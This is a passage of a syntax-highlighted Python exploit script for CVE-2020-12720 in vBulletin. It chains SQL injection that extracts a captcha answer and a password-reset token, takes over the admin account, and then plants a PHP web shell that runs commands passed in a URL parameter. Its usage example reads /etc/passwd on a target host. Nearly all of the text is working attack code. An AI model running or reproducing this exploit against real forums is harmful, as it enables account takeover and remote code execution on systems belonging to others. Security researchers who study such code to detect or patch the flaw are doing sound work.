<span class="w">    </span><span class="n">lData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="s1">&#39;nodeId[nodeid]&#39;</span><span class="p">:</span><span class="s1">&#39;1 UNION SELECT 26,25,24,23,22,21,20,19,20,17,16,15,14,13,12,11,10,answer,8,7,6,5,4,3,2,1 from &#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">sPrefix</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">&#39;humanverify limit &#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">str</span><span class="p">(</span><span class="n">iAnswers</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">&#39;,1--&#39;</span><span class="p">}</span>
<span class="w">    </span><span class="n">sResponse</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getData</span><span class="p">(</span><span class="n">sURL</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">sPath</span><span class="p">,</span><span class="w"> </span><span class="n">lData</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="s1">&#39;rawtext&#39;</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">sResponse</span><span class="p">:</span><span class="w"> </span><span class="n">sAnswer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sResponse</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;rawtext&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;}&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;&quot;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
<span class="w">    </span><span class="k">else</span><span class="p">:</span><span class="w"> </span><span class="n">sAnswer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span>

<span class="w">    </span><span class="c1">## Now request PW reset and retrieve the token</span>
<span class="w">    </span><span class="n">sPath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;auth/lostpw&#39;</span>
<span class="w">    </span><span class="n">lData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="s1">&#39;email&#39;</span><span class="p">:</span><span class="n">sUsermail</span><span class="p">,</span><span class="s1">&#39;humanverify[input]&#39;</span><span class="p">:</span><span class="n">sAnswer</span><span class="p">,</span><span class="s1">&#39;humanverify[hash]&#39;</span><span class="p">:</span><span class="n">sHash</span><span class="p">,</span><span class="s1">&#39;securitytoken&#39;</span><span class="p">:</span><span class="s1">&#39;guest&#39;</span><span class="p">}</span>
<span class="w">    </span><span class="n">sResponse</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getData</span><span class="p">(</span><span class="n">sURL</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">sPath</span><span class="p">,</span><span class="w"> </span><span class="n">lData</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>

<span class="w">    </span><span class="n">sPath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;ajax/api/content_infraction/getIndexableContent&#39;</span>
<span class="w">    </span><span class="n">lData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="s1">&#39;nodeId[nodeid]&#39;</span><span class="p">:</span><span class="s1">&#39;1 UNION SELECT 26,25,24,23,22,21,20,19,20,17,16,15,14,13,12,11,10,activationid,8,7,6,5,4,3,2,1 from &#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">sPrefix</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">&#39;useractivation WHERE userid=&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">sUserid</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">&#39; limit 0,1--&#39;</span><span class="p">}</span>
<span class="w">    </span><span class="n">sResponse</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getData</span><span class="p">(</span><span class="n">sURL</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">sPath</span><span class="p">,</span><span class="w"> </span><span class="n">lData</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="s1">&#39;rawtext&#39;</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">sResponse</span><span class="p">:</span><span class="w"> </span><span class="n">sToken</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sResponse</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;rawtext&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;}&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;&quot;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
<span class="w">    </span><span class="k">else</span><span class="p">:</span><span class="w"> </span><span class="n">sToken</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span>

<span class="w">    </span><span class="c1">## Finally the password reset itself</span>
<span class="w">    </span><span class="n">sPath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;auth/reset-password&#39;</span>
<span class="w">    </span><span class="n">lData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="s1">&#39;userid&#39;</span><span class="p">:</span><span class="n">sUserid</span><span class="p">,</span><span class="s1">&#39;activationid&#39;</span><span class="p">:</span><span class="n">sToken</span><span class="p">,</span><span class="s1">&#39;new-password&#39;</span><span class="p">:</span><span class="n">sNEWPASS</span><span class="p">,</span><span class="s1">&#39;new-password-confirm&#39;</span><span class="p">:</span><span class="n">sNEWPASS</span><span class="p">,</span><span class="s1">&#39;securitytoken&#39;</span><span class="p">:</span><span class="s1">&#39;guest&#39;</span><span class="p">}</span>
<span class="w">    </span><span class="n">sResponse</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getData</span><span class="p">(</span><span class="n">sURL</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">sPath</span><span class="p">,</span><span class="w"> </span><span class="n">lData</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="s1">&#39;Logging in&#39;</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">sResponse</span><span class="p">:</span>
<span class="w">        </span><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[-] Failed to reset the password&#39;</span><span class="p">)</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="s1">&#39;&#39;</span>
<span class="w">    </span><span class="k">else</span><span class="p">:</span>
<span class="w">        </span><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[+] Success! User &#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">sUsername</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">&#39; now has password &#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">sNEWPASS</span><span class="p">)</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">sUserid</span>

<span class="n">def</span><span class="w"> </span><span class="n">createBackdoor</span><span class="p">(</span><span class="n">sURL</span><span class="p">,</span><span class="w"> </span><span class="n">sADMINPASS</span><span class="p">,</span><span class="w"> </span><span class="n">sUserid</span><span class="o">=</span><span class="s1">&#39;1&#39;</span><span class="p">):</span>
<span class="w">    </span><span class="c1">## Activating Sitebuilder</span>
<span class="w">    </span><span class="n">sPath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;ajax/activate-sitebuilder&#39;</span>
<span class="w">    </span><span class="n">lData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="s1">&#39;pageid&#39;</span><span class="p">:</span><span class="s1">&#39;1&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;nodeid&#39;</span><span class="p">:</span><span class="s1">&#39;0&#39;</span><span class="p">,</span><span class="s1">&#39;userid&#39;</span><span class="p">:</span><span class="s1">&#39;1&#39;</span><span class="p">,</span><span class="s1">&#39;loadMenu&#39;</span><span class="p">:</span><span class="s1">&#39;false&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;isAjaxTemplateRender&#39;</span><span class="p">:</span><span class="s1">&#39;true&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;isAjaxTemplateRenderWithData&#39;</span><span class="p">:</span><span class="s1">&#39;true&#39;</span><span class="p">,</span><span class="s1">&#39;securitytoken&#39;</span><span class="p">:</span><span class="s1">&#39;1589477194-0e3085507fb50fc1631610a28e045c5fa71a2a12&#39;</span><span class="p">}</span>
<span class="w">    </span><span class="n">oResponse</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getData</span><span class="p">(</span><span class="n">sURL</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">sPath</span><span class="p">,</span><span class="w"> </span><span class="n">lData</span><span class="p">)</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">oResponse</span><span class="o">.</span><span class="n">code</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">200</span><span class="p">:</span>
<span class="w">        </span><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[-] Error activating sitebuilder&#39;</span><span class="p">)</span>
<span class="w">        </span><span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="w">    </span><span class="c1">## Confirming the password, getting new securitytoken</span>
<span class="w">    </span><span class="n">sPath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;auth/ajax-login&#39;</span>
<span class="w">    </span><span class="n">lData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="s1">&#39;logintype&#39;</span><span class="p">:</span><span class="s1">&#39;cplogin&#39;</span><span class="p">,</span><span class="s1">&#39;userid&#39;</span><span class="p">:</span><span class="n">sUserid</span><span class="p">,</span><span class="s1">&#39;password&#39;</span><span class="p">:</span><span class="n">sADMINPASS</span><span class="p">,</span><span class="s1">&#39;securitytoken&#39;</span><span class="p">:</span><span class="s1">&#39;1589477194-0e3085507fb50fc1631610a28e045c5fa71a2a12&#39;</span><span class="p">}</span>
<span class="w">    </span><span class="n">oResponse</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getData</span><span class="p">(</span><span class="n">sURL</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">sPath</span><span class="p">,</span><span class="w"> </span><span class="n">lData</span><span class="p">)</span>
<span class="w">    </span><span class="n">sResponse</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">oResponse</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="s1">&#39;lostpw&#39;</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">sResponse</span><span class="p">:</span>
<span class="w">        </span><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[-] Error: authentication for userid &#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">sUserid</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">&#39; failed&#39;</span><span class="p">)</span>
<span class="w">        </span><span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="w">    </span><span class="n">sToken</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sResponse</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;&quot;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;}&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
<span class="w">    </span><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[+] Got token: &#39;</span><span class="o">+</span><span class="n">sToken</span><span class="p">)</span>

<span class="w">    </span><span class="c1">## cpsession is needed, use this for extra verification</span>
<span class="w">    </span><span class="c1">#for cookie in cj: print(cookie.name, cookie.value, cookie.domain) #etc etc</span>

<span class="w">    </span><span class="c1">## First see if our backdoor does not already exists</span>
<span class="w">    </span><span class="n">sPath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;ajax/render/admin_sbpanel_pagelist_content_wrapper&#39;</span>
<span class="w">    </span><span class="n">lData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="s1">&#39;isAjaxTemplateRenderWithData&#39;</span><span class="p">:</span><span class="s1">&#39;true&#39;</span><span class="p">,</span><span class="s1">&#39;securitytoken&#39;</span><span class="p">:</span><span class="n">sToken</span><span class="p">}</span>
<span class="w">    </span><span class="n">oResponse</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getData</span><span class="p">(</span><span class="n">sURL</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">sPath</span><span class="p">,</span><span class="w"> </span><span class="n">lData</span><span class="p">)</span>
<span class="w">    </span><span class="n">sResponse</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">oResponse</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="s1">&#39;cve-2020-12720&#39;</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">sResponse</span><span class="p">:</span>
<span class="w">        </span><span class="n">sPageName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;cve-2020-12720-&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">sResponse</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;/cve-2020-12720-&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;)&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
<span class="w">        </span><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[+] This machine was already pwned, using &quot;&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">sPageName</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">&#39;&quot; for your command&#39;</span><span class="p">)</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">sPageName</span>


<span class="w">    </span><span class="c1">## Create a new empty page</span>
<span class="w">    </span><span class="n">sPath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;ajax/api/widget/saveNewWidgetInstance&#39;</span>
<span class="w">    </span><span class="n">lData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="s1">&#39;containerinstanceid&#39;</span><span class="p">:</span><span class="s1">&#39;0&#39;</span><span class="p">,</span><span class="s1">&#39;widgetid&#39;</span><span class="p">:</span><span class="s1">&#39;23&#39;</span><span class="p">,</span><span class="s1">&#39;pagetemplateid&#39;</span><span class="p">:</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;securitytoken&#39;</span><span class="p">:</span><span class="n">sToken</span><span class="p">}</span>
<span class="w">    </span><span class="n">oResponse</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getData</span><span class="p">(</span><span class="n">sURL</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">sPath</span><span class="p">,</span><span class="w"> </span><span class="n">lData</span><span class="p">)</span>
<span class="w">    </span><span class="n">sResponse</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">oResponse</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
<span class="w">    </span><span class="n">sWidgetInstanceID</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sResponse</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;}&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
<span class="w">    </span><span class="n">sPageTemplateID</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sResponse</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;}&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
<span class="w">    </span><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[+] Got WidgetInstanceID: &#39;</span><span class="o">+</span><span class="n">sWidgetInstanceID</span><span class="o">+</span><span class="s1">&#39; and PageTemplateID: &#39;</span><span class="o">+</span><span class="n">sPageTemplateID</span><span class="p">)</span>

<span class="w">    </span><span class="c1">## Now submitting the page content</span>
<span class="w">    </span><span class="n">sPageName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;cve-2020-12720-&#39;</span><span class="o">+</span><span class="n">randomString</span><span class="p">()</span>
<span class="w">    </span><span class="n">sPath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;ajax/api/widget/saveAdminConfig&#39;</span>
<span class="w">    </span><span class="n">lData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="s1">&#39;widgetid&#39;</span><span class="p">:</span><span class="s1">&#39;23&#39;</span><span class="p">,</span>
<span class="w">             </span><span class="s1">&#39;pagetemplateid&#39;</span><span class="p">:</span><span class="n">sPageTemplateID</span><span class="p">,</span>
<span class="w">             </span><span class="s1">&#39;widgetinstanceid&#39;</span><span class="p">:</span><span class="n">sWidgetInstanceID</span><span class="p">,</span>
<span class="w">             </span><span class="s1">&#39;data[widget_type]&#39;</span><span class="p">:</span><span class="s1">&#39;&#39;</span><span class="p">,</span>
<span class="w">             </span><span class="s1">&#39;data[title]&#39;</span><span class="p">:</span><span class="n">sPageName</span><span class="p">,</span>
<span class="w">             </span><span class="s1">&#39;data[show_at_breakpoints][desktop]&#39;</span><span class="p">:</span><span class="s1">&#39;1&#39;</span><span class="p">,</span>
<span class="w">             </span><span class="s1">&#39;data[show_at_breakpoints][small]&#39;</span><span class="p">:</span><span class="s1">&#39;1&#39;</span><span class="p">,</span>
<span class="w">             </span><span class="s1">&#39;data[show_at_breakpoints][xsmall]&#39;</span><span class="p">:</span><span class="s1">&#39;1&#39;</span><span class="p">,</span>
<span class="w">             </span><span class="s1">&#39;data[hide_title]&#39;</span><span class="p">:</span><span class="s1">&#39;0&#39;</span><span class="p">,</span>
<span class="w">             </span><span class="s1">&#39;data[module_viewpermissions][key]&#39;</span><span class="p">:</span><span class="s1">&#39;show_all&#39;</span><span class="p">,</span>
<span class="w">             </span><span class="s1">&#39;data[code]&#39;</span><span class="p">:</span><span class="s2">&quot;echo(&#39;###SHELLRESULT###&#39;);system($_GET[&#39;cmd&#39;]);echo(&#39;###SHELLRESULT###&#39;);&quot;</span><span class="p">,</span>
<span class="w">             </span><span class="s1">&#39;securitytoken&#39;</span><span class="p">:</span><span class="n">sToken</span><span class="p">}</span>
<span class="w">    </span><span class="n">oResponse</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getData</span><span class="p">(</span><span class="n">sURL</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">sPath</span><span class="p">,</span><span class="w"> </span><span class="n">lData</span><span class="p">)</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">oResponse</span><span class="o">.</span><span class="n">code</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">200</span><span class="p">:</span><span class="w"> </span><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[!] Error submitting page content for &#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">sPageName</span><span class="p">)</span>

<span class="w">    </span><span class="c1">## Finally saving the new page</span>
<span class="w">    </span><span class="n">sPath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;admin/savepage&#39;</span>
<span class="w">    </span><span class="n">lData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="s1">&#39;input[ishomeroute]&#39;</span><span class="p">:</span><span class="s1">&#39;0&#39;</span><span class="p">,</span>
<span class="w">             </span><span class="s1">&#39;input[pageid]&#39;</span><span class="p">:</span><span class="s1">&#39;0&#39;</span><span class="p">,</span>
<span class="w">             </span><span class="s1">&#39;input[nodeid]&#39;</span><span class="p">:</span><span class="s1">&#39;0&#39;</span><span class="p">,</span>
<span class="w">             </span><span class="s1">&#39;input[userid]&#39;</span><span class="p">:</span><span class="s1">&#39;1&#39;</span><span class="p">,</span>
<span class="w">             </span><span class="s1">&#39;input[screenlayoutid]&#39;</span><span class="p">:</span><span class="s1">&#39;2&#39;</span><span class="p">,</span>
<span class="w">             </span><span class="s1">&#39;input[templatetitle]&#39;</span><span class="p">:</span><span class="n">sPageName</span><span class="p">,</span>
<span class="w">             </span><span class="s1">&#39;input[displaysections[0]]&#39;</span><span class="p">:</span><span class="s1">&#39;[{&quot;widgetId&quot;:&quot;23&quot;,&quot;widgetInstanceId&quot;:&quot;&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">sWidgetInstanceID</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">&#39;&quot;}]&#39;</span><span class="p">,</span>
<span class="w">             </span><span class="s1">&#39;input[displaysections[1]]&#39;</span><span class="p">:</span><span class="s1">&#39;[]&#39;</span><span class="p">,</span>
<span class="w">             </span><span class="s1">&#39;input[displaysections[2]]&#39;</span><span class="p">:</span><span class="s1">&#39;[]&#39;</span><span class="p">,</span>
<span class="w">             </span><span class="s1">&#39;input[displaysections[3]]&#39;</span><span class="p">:</span><span class="s1">&#39;[]&#39;</span><span class="p">,</span>
<span class="w">             </span><span class="s1">&#39;input[pagetitle]&#39;</span><span class="p">:</span><span class="n">sPageName</span><span class="p">,</span>
<span class="w">             </span><span class="s1">&#39;input[resturl]&#39;</span><span class="p">:</span><span class="n">sPageName</span><span class="p">,</span>
<span class="w">             </span><span class="s1">&#39;input[metadescription]&#39;</span><span class="p">:</span><span class="s1">&#39;Photubias+Shell&#39;</span><span class="p">,</span>
<span class="w">             </span><span class="s1">&#39;input[pagetemplateid]&#39;</span><span class="p">:</span><span class="n">sPageTemplateID</span><span class="p">,</span>
<span class="w">             </span><span class="s1">&#39;url&#39;</span><span class="p">:</span><span class="n">sURL</span><span class="p">,</span>
<span class="w">             </span><span class="s1">&#39;securitytoken&#39;</span><span class="p">:</span><span class="n">sToken</span><span class="p">}</span>
<span class="w">    </span><span class="n">oResponse</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getData</span><span class="p">(</span><span class="n">sURL</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">sPath</span><span class="p">,</span><span class="w"> </span><span class="n">lData</span><span class="p">)</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">oResponse</span><span class="o">.</span><span class="n">code</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">200</span><span class="p">:</span><span class="w"> </span><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[!] Error saving page content for &#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">sPageName</span><span class="p">)</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">sPageName</span>

<span class="n">def</span><span class="w"> </span><span class="n">main</span><span class="p">():</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="n">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">1</span><span class="p">:</span>
<span class="w">        </span><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[!] No arguments found: python3 CVE-2020-12720.py &lt;URL&gt; &lt;CMD&gt;&#39;</span><span class="p">)</span>
<span class="w">        </span><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;    Example: ./CVE-2020-12720.py http://192.168.50.130/ &quot;cat /etc/passwd&quot;&#39;</span><span class="p">)</span>
<span class="w">        </span><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;    But for now, ask questions then&#39;</span><span class="p">)</span>
<span class="w">        </span><span class="n">sURL</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">input</span><span class="p">(</span><span class="s1">&#39;[?] Please enter the address and path to vBulletin ([http://192.168.50.130/): &#39;</span><span class="p">)</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="n">sURL</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">:</span><span class="w"> </span><span class="n">sURL</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;http://192.168.50.130&#39;</span>
<span class="w">    </span><span class="k">else</span><span class="p">:</span>
<span class="w">        </span><span class="n">sURL</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="w">        </span><span class="n">sCMD</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">sURL</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s1">&#39;/&#39;</span><span class="p">:</span><span class="w"> </span><span class="n">sURL</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="s1">&#39;/&#39;</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">sURL</span><span class="p">[:</span><span class="mi">4</span><span class="p">]</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s1">&#39;http&#39;</span><span class="p">:</span><span class="w"> </span><span class="n">sURL</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;http://&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">sURL</span>
<span class="w">    </span><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[+] Welcome, first verifying the SQLi vulnerability&#39;</span><span class="p">)</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="n">verifyBug</span><span class="p">(</span><span class="n">sURL</span><span class="p">):</span>
<span class="w">        </span><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;----</span><span class="se">\n</span><span class="s2">&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">&#39;[+] Attempting automatic admin account takeover&#39;</span><span class="p">)</span>
<span class="w">        </span><span class="n">sUSERID</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">takeoverAccount</span><span class="p">(</span><span class="n">sURL</span><span class="p">,</span><span class="w"> </span><span class="n">sNEWPASS</span><span class="p">)</span>
<span class="w">        </span><span class="n">sADMINPASS</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sNEWPASS</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="n">sUSERID</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">:</span>
<span class="w">            </span><span class="n">sUSERID</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;1&#39;</span>
